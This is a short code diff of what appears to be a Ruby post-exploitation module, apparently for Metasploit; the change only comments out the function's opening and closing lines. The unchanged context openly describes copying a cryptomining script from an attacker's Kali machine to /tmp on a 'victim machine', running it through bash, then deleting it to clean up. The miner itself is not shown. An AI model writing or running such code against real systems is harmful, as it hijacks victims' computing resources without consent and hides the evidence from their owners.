@@ -1,4 +1,4 @@
-def run_script(client)
+#def run_script(client)
 # Define the paths for the cryptomining script on both attacker and victim machines
 local_cryptomining_script = "/home/kali/Documents/cryptomining.sh"   # Local path on attacker machine
 remote_cryptomining_script = "/tmp/cryptomining.sh"                 # Remote path on victim machine
@@ -25,4 +25,4 @@ cmd_exec("bash -c 'timeout 5 #{remote_cryptomining_script}'")
 print_status("Cleaning up uploaded files...")
 cmd_exec("rm -f #{remote_cryptomining_script}")
 print_good("Cryptomining script executed and cleaned up.")
-end
+#end
